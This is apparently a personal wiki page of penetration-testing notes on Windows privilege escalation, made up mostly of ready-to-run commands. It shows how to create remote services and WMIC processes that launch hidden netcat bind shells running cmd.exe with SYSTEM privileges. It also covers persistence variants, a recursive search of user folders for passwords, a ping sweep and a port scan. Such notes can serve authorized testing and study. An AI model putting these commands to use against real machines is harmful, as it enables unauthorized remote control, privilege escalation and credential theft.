---
title: Privilege Escalation
description: 
published: true
date: 2021-08-14T21:28:47.106Z
tags: security, pentesting, privesc
editor: markdown
dateCreated: 2021-08-14T21:28:47.106Z
---

# Privilege Escalation
# Services

Sc \\hostname/ip create ncservice binpath= "c:\tools\nc\nc.exe -l -p 2222 -e cmd.exe"           ///IMPORTANT space after "binpath= "

Sc \\hostname/ip query ncservice
 => Service is stopped

 
Make more persistent
Sc \\hostname create ncservice2 binpath= "cmd.exe /k c:\tools\nc\nc.exe -l -p 2222 -e cmd.exe"

sc \\w10 start ncservice2      //will then crash after 30sec but doesnt matter
Nc 127.0.0.1 222
==> run with SYSTEM privileges via the servic created

Victim monitor for port 2222 connections:
Netstat nao 1 | find ":2222"


## WMIC 

wmic process call create "c:\tools\nc\nc.exe -l -p 4444 -e cmd.exe"   ==> Creates cmd popup for user, bad! Use -d option


wmic process call create "c:\tools\nc\nc.exe -d -l -p 4444 -e cmd.exe"

Nc 127.0.0.1 4444


# Network
**Search for a pattern "password" in a directory**
ls -r c:\users | % {sls -path $_ -pattern password} 2>$null

 
**Setup a new service which will start cmd with netcat started:**
New-Service -Name "ncservice" -BinaryPathName "cmd.exe /k C:\tools\nc\nc.exe -l -p 3333 -e cmd.exe" -StartupType manual
Start-Service -Name ncservice
Sc.exe delete ncservice


**Ping sweet with powershell:**
1..255 | % {ping -n 1 -w 100 10.10.10.$_ | sls ttl}

 
**Portscan:**
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_  is open"} 2>$null

